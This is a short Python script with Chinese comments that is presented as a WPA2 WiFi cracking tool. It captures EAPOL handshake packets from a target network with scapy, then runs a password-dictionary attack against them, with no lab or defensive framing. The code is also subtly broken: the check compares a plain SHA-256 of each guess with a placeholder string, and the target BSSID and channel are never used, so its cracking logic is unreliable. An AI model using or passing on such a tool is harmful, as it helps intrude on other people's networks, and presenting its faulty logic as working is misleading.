import scapy.all as scapy
import hashlib
import time
import itertools

# 捕获WiFi握手包的功能
def capture_handshake(interface, target_bssid, channel, timeout=60):
    print(f"开始捕获握手包，目标 BSSID: {target_bssid}, 通道: {channel}")
    scapy.sniff(iface=interface, prn=process_packet, store=0, timeout=timeout)

# 处理捕获到的数据包
def process_packet(packet):
    if packet.haslayer(scapy.EAPOL):  # 如果捕获到 EAPOL 握手包
        print("捕获到握手包！")
        with open("handshake.cap", "wb") as f:
            f.write(bytes(packet))
        print("握手包已保存为 handshake.cap")
        return True
    return False

# 用字典进行暴力破解
def crack_password_with_dict(handshake_file, dictionary_file):
    print("开始使用字典暴力破解密码...")
    
    with open(dictionary_file, 'r') as f:
        for line in f.readlines():
            password = line.strip()
            if check_password(handshake_file, password):
                print(f"密码破解成功！密码是：{password}")
                return password
    print("密码破解失败！")
    return None

# 解析 WPA2 哈希并与密码进行比较
def check_password(handshake_file, password):
    """
    提取握手包中的哈希并验证密码是否正确
    这里我们假设你已经有了握手包的基本解析代码，手动提取 WPA2 哈希
    """
    # 你可以根据自己的需求解析 WPA2 握手包获取哈希值
    # 假设你有握手包的正确哈希值
    # 这里是简化版，直接进行 SHA256 验证（实际过程中你需要通过握手包解析得到真正的 WPA2 哈希）

    # WPA2 验证，哈希计算
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    print(f"正在检查密码: {password}, 哈希值: {hashed_password}")
    
    # 示例哈希值对比，你需要用真正的哈希值进行验证
    # 实际情况需要提取握手包中的 PMK 和用其进行验证
    expected_hash = "预计的哈希值"  # 替换为正确的值
    
    return hashed_password == expected_hash  # 这里做对比，实际应用中会通过握手包提取正确的哈希值

# 主程序入口
def main():
    interface = input("请输入网卡接口名称（如 en0）: ")  # 你在 macOS 上使用的网卡接口
    target_bssid = input("请输入目标 WiFi 的 BSSID: ")  # 目标 WiFi 网络的 BSSID
    channel = int(input("请输入目标 WiFi 网络的通道号: "))  # 目标网络的频道
    dictionary_file = input("请输入字典文件路径: ")  # 密码字典文件路径（例如 rockyou.txt）
    
    # 捕获握手包
    capture_handshake(interface, target_bssid, channel)

    # 使用字典暴力破解密码
    password = crack_password_with_dict("handshake.cap", dictionary_file)
    
    if password:
        print(f"破解成功，WiFi 密码是：{password}")
    else:
        print("密码破解失败！")

if __name__ == "__main__":
    main()